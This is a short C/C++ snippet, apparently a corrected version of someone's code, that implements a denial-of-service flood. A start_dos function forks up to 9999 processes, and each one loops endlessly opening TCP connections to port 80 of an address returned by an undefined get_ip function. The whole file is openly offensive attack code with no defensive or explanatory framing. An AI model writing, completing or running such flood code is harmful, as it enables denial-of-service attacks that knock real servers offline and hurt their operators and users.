#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

const char* get_ip();   // ← only this line at the top

void raw_flood() {
    while(1) {
        int s = socket(2,1,0);
        sockaddr_in a{2, htons(80), inet_addr(get_ip())};  // ← HERE, INSIDE FUNCTION!
        connect(s, (sockaddr*)&a, 16);
        send(s, "X", 1, 0);
        close(s);
    }
}

void start_dos() {
    srand(time(0));
    for(int i = 0; i < 9999; i++) {
        if(!fork()) { raw_flood(); exit(0); }
    }
}